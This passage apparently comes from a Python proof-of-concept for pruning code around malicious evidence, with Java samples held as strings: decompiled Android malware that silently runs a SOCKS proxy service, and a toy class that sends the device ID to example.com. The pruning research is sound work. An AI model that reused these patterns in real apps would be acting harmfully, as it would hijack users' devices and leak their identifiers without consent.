            return g.a(this, "icons/" + str + ".png");
        }
        try {
            return g.a(getPackageManager().getApplicationIcon(str));
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

    private void b() {
        try {
            if (this.d != null && !this.d.isHeld()) {
                this.d.release();
            }
            if (this.c == null || this.c.isHeld()) {
                return;
            }
            this.c.release();
        } catch (Exception e) {
            b.a(e.toString());
        }
    }

    private void c() throws Exception {
        new Thread(new Runnable() { // from class: android.system.sa.SS.1
            @Override // java.lang.Runnable
            @SuppressLint({"NewApi"})
            public void run() {
                long j;
                try {
                    long currentTimeMillis = System.currentTimeMillis();
                    try {
                        j = (Long.valueOf(SS.this.e.getString(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT)).longValue() * 1000) + currentTimeMillis;
                    } catch (Exception e) {
                        e.printStackTrace();
                        j = 0;
                    }
                    while (true) {
                        if (Build.VERSION.SDK_INT < 20) {
                            if (SS.this.b.isScreenOn()) {
                                SS.this.a("powerManager");
                                return;
                            }
                        } else if (SS.this.b.isInteractive()) {
                            SS.this.a("powerManager");
                            return;
                        }
                        if (j != currentTimeMillis && System.currentTimeMillis() > j) {
                            SS.this.a(MyTargetVideoView.COMPLETE_STATUS_TIMEOUT);
                            return;
                        }
                        if (!SS.this.d()) {
                            SS.this.a("no internet");
                        }
                        try {
                            Thread.currentThread();
                            Thread.sleep(100L);
                        } catch (InterruptedException e2) {
                        }
                    }
                } catch (Exception e3) {
                    b.a("catch works");
                    SS.this.a("Exception");
                }
            }
        }).start();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean d() {
        NetworkInfo activeNetworkInfo = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();
    }

    private void e() {
        new a().execute(new Integer[0]);
    }

    @SuppressLint({"NewApi"})
    private void f() {
        Notification build;
        Intent intent = new Intent(this, (Class<?>) android.system.sa.a.class);
        intent.setAction("socks");
        intent.setFlags(268468224);
        PendingIntent activity = PendingIntent.getActivity(this, 0, intent, 0);
        try {
            Bitmap b = b(this.e.getString("icon"));
            if (b != null) {
                b.a("icon != null");
                build = Build.VERSION.SDK_INT >= 16 ? new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(b, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build() : new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(b, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).getNotification();
            } else {
                b.a("icon = null");
                build = Build.VERSION.SDK_INT >= 16 ? new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).build() : new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).getNotification();
            }
            startForeground(101, build);
        } catch (Exception e) {
            b.a(e.toString());
            android.system.f.a.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.b = (PowerManager) getSystemService("power");
    }

    @Override // android.app.Service
    public void onDestroy() {
        a("onDestroy");
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        this.a = this;
        try {
            this.e = new JSONObject(intent.getExtras().getString("socks"));
        } catch (Exception e) {
            android.system.f.a.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
        }
        try {
            a();
            f();
            b.a("startExitThread");
            c();
            b.a("startSocksAsyncTask");
            e();
            return 2;
        } catch (Exception e2) {
            b.a(e2.toString());
            android.system.f.a.a(this.a, "exit", e2.toString());
            stopSelf();
            System.exit(0);
            return 2;
        }
    }
}
'''


# ============================================================
# RUN POC
# ============================================================

if __name__ == "__main__":
    evidence_guided_prune(
        class_source=DUMMY_CLASS,
        keep_ratio=0.30,
        max_tokens=512,
        top_k_ratio=0.10,
        min_seeds=4,
        backward_depth=8,
        forward_depth=8,
    )


    """package com.example.malware;

import android.telephony.TelephonyManager;
import android.util.Base64;
import java.net.HttpURLConnection;
import java.net.URL;

public class Collector {

    private TelephonyManager tm;

    public Collector(TelephonyManager tm) {
        this.tm = tm;
    }

    public void harmlessInitialization() {
        int a = 10;
        int b = 20;
        int c = a + b;
        String message = "normal application work";
        log(message);
    }

    public void collectAndUpload() {

        String deviceId = tm.getDeviceId();

        String unrelated = "this should be removed";

        int filler1 = 100;
        int filler2 = filler1 + 20;

        String encoded =
            Base64.encodeToString(
                deviceId.getBytes(),
                Base64.DEFAULT
            );

        String server =
            "https://example.com/upload";

        String payload =
            buildPayload(
                encoded,
                server
            );

        if (payload != null) {

            String response =
                upload(
                    server,
                    payload
                );

            log(response);
        }

        cleanup();
    }

    private String buildPayload(
        String value,
        String server
    ) {

        String prefix = "id=";

        String combined =
            prefix + value;

        return combined;
    }

    private String upload(
        String server,
        String payload
    ) {

        String result = "";

        try {

            URL url =
                new URL(server);

            HttpURLConnection connection =
                (HttpURLConnection)
                url.openConnection();

            connection.setRequestMethod(
                "POST"
            );

            connection
                .getOutputStream()
                .write(
                    payload.getBytes()
                );

            result =
                connection
                    .getResponseMessage();

        } catch (Exception e) {

            log(
                e.toString()
            );
        }

        return result;
    }

    private void cleanup() {

        int x = 1;
        int y = x + 1;

        log("cleanup");
    }

    private void log(
        String message
    ) {

        System.out.println(
            message
        );
    }
}"""